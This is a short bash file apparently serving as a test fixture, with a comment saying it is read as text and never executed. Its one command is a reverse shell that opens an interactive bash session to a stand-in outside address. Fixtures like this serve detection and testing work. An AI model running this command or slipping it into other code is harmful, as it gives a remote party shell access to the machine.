#!/usr/bin/env bash

# Test fixture only. This file is read as text and must never be executed.
bash -i >& /dev/tcp/192.0.2.10/65535 0>&1
